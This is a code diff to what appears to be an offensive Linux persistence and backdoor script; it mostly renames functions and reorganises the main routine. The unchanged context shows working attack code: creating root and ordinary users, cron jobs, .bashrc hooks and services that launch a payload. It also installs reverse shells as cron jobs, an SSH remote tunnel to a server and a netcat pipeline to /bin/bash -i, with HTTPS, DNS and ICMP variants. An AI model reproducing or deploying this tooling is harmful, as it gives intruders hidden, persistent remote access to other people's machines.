@@ -40,7 +40,7 @@ Finally it displays info about the processes and the results obtained
 
 These are the possible actions this script can execute:
    - protocols: HTTPS, DNS, ICMP
-   - techniques: checkRoot, adduser, crontab, init, service, sshShell, sshAuth, ncShell,
+   - techniques: checkRoot, addUser, crontab, init, service, sshShell, sshAuth, ncShell,
             toolHTTPS, toolDNS, toolICMP
 
 
@@ -207,7 +207,7 @@ if ("ICMP" not in config["preferences"]["excludedProtocols"]
     SEARCH_TECH.append("ICMP")
 
 
-EXEC_TECH = ["checkRoot", "copyFile", "downloadFile", "adduser", "crontab", "init", "service", "sshShell", "sshAuth", 
+EXEC_TECH = ["checkRoot", "copyFile", "downloadFile", "addUser", "crontab", "init", "service", "sshShell", "sshAuth", 
 "ncShell","toolHTTPS", "toolDNS", "toolICMP"]
 
 if config["preferences"]["includedTechniques"]: EXEC_TECH = config["preferences"]["includedTechniques"]
@@ -549,7 +549,7 @@ def new_root_user(adduser_args, adduser_name, adduser_passwd):
 
 ##### Tool reverse shell #####
 
-def tool_generic_shell(cron_time, tool_command, is_root):
+def start_generic_shell(cron_time, tool_command, is_root):
     
     if is_root: 
         final_tool_command = f'{cron_time}    root    {tool_command}'
@@ -561,7 +561,7 @@ def tool_generic_shell(cron_time, tool_command, is_root):
     return True
 
 
-def tool_https_shell(proxy, https_command, https_command_pre, https_command_post, cron_time, is_root):
+def start_https_shell(proxy, https_command, https_command_pre, https_command_post, cron_time, is_root):
 
     tool_https_command = https_command
 
@@ -569,7 +569,7 @@ def tool_https_shell(proxy, https_command, https_command_pre, https_command_post
         tool_https_command = f"{https_command_pre}{proxy}{https_command_post}"
 
     
-    tool_generic_shell(cron_time, tool_https_command, is_root)
+    start_generic_shell(cron_time, tool_https_command, is_root)
 
     return True
 
@@ -580,7 +580,7 @@ def ssh_reverse_shell(cron_time, is_root, server_ip, server_port, server_user):
 
     ssh_revshell_command = f'ssh -f -N -T -R{server_port}:localhost:22 {server_user}@{server_ip}'
 
-    tool_generic_shell(cron_time, ssh_revshell_command, is_root)
+    start_generic_shell(cron_time, ssh_revshell_command, is_root)
 
     return True
 
@@ -612,7 +612,7 @@ def nc_reverse_shell(cron_time, is_root, server_ip, server_port):
     nc_commands = "rm -f /tmp/sysfifofile; mkfifo /tmp/sysfifofile;"
     nc_commands += f"cat /tmp/sysfifofile | /bin/bash -i 2>&1 | nc -l {server_ip} {server_port} > /tmp/sysfifofile"
 
-    tool_generic_shell(cron_time, nc_commands, is_root)
+    start_generic_shell(cron_time, nc_commands, is_root)
 
     return True
 
@@ -674,9 +674,11 @@ def main():
         file_copied = copy_file(config["payload"]["path"], config["payload"]["pathToSave"])
         print(f'- File copied to path "{PAYLOAD_PATH}": {change_message(file_copied)}')
 
+    # Root persistence
+
     if is_root:
 
-        if "adduser" in EXEC_TECH:
+        if "addUser" in EXEC_TECH:
             adding_user = new_root_user(config["persistence"]["adduserArgs"], config["persistence"]["adduserName"], config["persistence"]["adduserPass"] )
             print(f'- User "{config["persistence"]["adduserName"]}" created as root user: {change_message(adding_user)}')
 
@@ -694,24 +696,27 @@ def main():
         if "service" in EXEC_TECH:
             added_service = new_service_root(config["persistence"]["serviceName"], config["persistence"]["serviceDesc"], PAYLOAD_LAUNCH) 
             print(f'- Added service running as root named "{config["persistence"]["serviceName"]}": {change_message(added_service)}')
-    else:
+    
+    # User persistence
 
-        if "adduser" in EXEC_TECH:
-            adding_user = new_user(config["persistence"]["adduserArgs"], config["persistence"]["adduserName"])
-            print(f'- User "{ADDUSER_NAME}" created: {change_message(adding_user)}')
+    if "addUser" in EXEC_TECH:
+        adding_user = new_user(config["persistence"]["adduserArgs"], config["persistence"]["adduserName"])
+        print(f'- User "{ADDUSER_NAME}" created: {change_message(adding_user)}')
 
-        if "crontab" in EXEC_TECH:
-            new_job = crontab_user(CRONJOB)
-            print(f'- Cronjob created: {change_message(new_job)}')
+    if "crontab" in EXEC_TECH:
+        new_job = crontab_user(CRONJOB)
+        print(f'- Cronjob created: {change_message(new_job)}')
 
-        if "init" in EXEC_TECH:
-            added_init = init_user(config["envvars"]["userHome"], PAYLOAD_LAUNCH, PAYLOAD_PATH, config["payload"]["name"]) 
-            print(f'- init user (.bashrc): {change_message(added_init)}')
+    if "init" in EXEC_TECH:
+        added_init = init_user(config["envvars"]["userHome"], PAYLOAD_LAUNCH, PAYLOAD_PATH, config["payload"]["name"]) 
+        print(f'- init user (.bashrc): {change_message(added_init)}')
 
-        if "service" in EXEC_TECH:
-            added_service = new_service_user(config["persistence"]["serviceName"], config["persistence"]["serviceDesc"], PAYLOAD_LAUNCH, config["envvars"]["userHome"]) 
-            print(f'- Added service named "{config["persistence"]["serviceName"]}": {change_message(added_service)}')
+    if "service" in EXEC_TECH:
+        added_service = new_service_user(config["persistence"]["serviceName"], config["persistence"]["serviceDesc"], PAYLOAD_LAUNCH, config["envvars"]["userHome"]) 
+        print(f'- Added service named "{config["persistence"]["serviceName"]}": {change_message(added_service)}')
         
+    
+    # Backdoors
     
     if "sshShell" in EXEC_TECH:
         cron_ssh = ssh_reverse_shell(config["persistence"]["cronjobTime"], is_root, 
@@ -727,17 +732,17 @@ def main():
         print(f'- Added a netcat reverse shell as a cronjob: {change_message(cron_nc)}')  
 
     if "toolHTTPS" in EXEC_TECH and has_https:
-        cron_http = tool_https_shell(config["discovery"]["proxy"], config["backdoors"]["HTTPSCommand"], 
+        cron_http = start_https_shell(config["discovery"]["proxy"], config["backdoors"]["HTTPSCommand"], 
             config["backdoors"]["HTTPSCommandPreProxy"], config["backdoors"]["HTTPSCommandPostProxy"], 
             config["persistence"]["cronjobTime"], is_root) 
         print(f'- Added a reverse shell via HTTPS as a cronjob: {change_message(cron_http)}')  
 
     if "toolDNS" in EXEC_TECH and has_dns:
-        cron_dns = tool_generic_shell(config["persistence"]["cronjobTime"], config["backdoors"]["DNSCommand"], is_root) 
+        cron_dns = start_generic_shell(config["persistence"]["cronjobTime"], config["backdoors"]["DNSCommand"], is_root) 
         print(f'- Added a reverse shell via DNS as a cronjob: {change_message(cron_dns)}')  
 
     if "toolICMP" in EXEC_TECH and has_ping:
-        cron_icmp = tool_generic_shell(config["persistence"]["cronjobTime"], config["backdoors"]["ICMPCommand"], is_root) 
+        cron_icmp = start_generic_shell(config["persistence"]["cronjobTime"], config["backdoors"]["ICMPCommand"], is_root) 
         print(f'- Added a reverse shell via ICMP as a cronjob: {change_message(cron_icmp)}')  
  
     print(f"\n Finished at {datetime.today().strftime('%H:%M:%S on %d/%m/%Y')}")
